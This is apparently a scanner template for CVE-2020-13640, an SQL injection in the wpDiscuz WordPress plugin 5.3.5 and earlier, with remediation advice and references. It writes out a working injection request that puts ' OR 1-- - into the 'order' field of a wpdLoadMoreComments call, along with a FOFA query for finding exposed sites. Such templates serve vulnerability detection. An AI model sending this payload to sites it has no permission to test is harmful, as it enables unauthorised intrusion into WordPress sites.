id: CVE-2020-13640

info:
  name: wpDiscuz Plugin 5.3.5 and Earlier - SQL Injection
  author: ritikchaddha
  severity: critical
  description: |
    A SQL injection issue in the gVectors wpDiscuz plugin 5.3.5 and earlier for WordPress allows remote attackers to execute arbitrary SQL commands via the order parameter of a wpdLoadMoreComments request. (No 7.x versions are affected.)
  remediation: |
    Update wpDiscuz plugin to version 5.3.6 or later.
  reference:
    - https://wpdiscuz.com/community/news/security-vulnerability-issue-in-5-3-5-please-udate/
    - https://wordpress.org/plugins/wpdiscuz/#developers
    - https://plugins.trac.wordpress.org/changeset/2323200
    - http://www.openwall.com/lists/oss-security/2020/07/06/1
    - https://nvd.nist.gov/vuln/detail/CVE-2020-13640
    - https://github.com/asterite3/CVE-2020-13640/blob/master/exploit.py
  classification:
    cve-id: CVE-2020-13640
    cwe-id: CWE-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    vendor: gvectors
    product: wpdiscuz
    max-request: 2
    verified: true
    fofa-query: body="/wp-content/plugins/wpdiscuz/"
  tags: cve,cve2020,wordpress,wpdiscuz,sqli

variables:
  string: "CVE-2020-13640"

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------14434359312532120894700338087

        -----------------------------14434359312532120894700338087
        Content-Disposition: form-data; name="action"

        wpdLoadMoreComments
        -----------------------------14434359312532120894700338087
        Content-Disposition: form-data; name="offset"

        1
        -----------------------------14434359312532120894700338087
        Content-Disposition: form-data; name="orderBy"

        comment_date_gmt
        -----------------------------14434359312532120894700338087
        Content-Disposition: form-data; name="order"

        ' OR 1-- -
        -----------------------------14434359312532120894700338087
        Content-Disposition: form-data; name="postId"

        1
        -----------------------------14434359312532120894700338087--

    matchers:
      - type: word
        part: body
        words:
          - "WordPress database error"
          - "SQL syntax"
        condition: or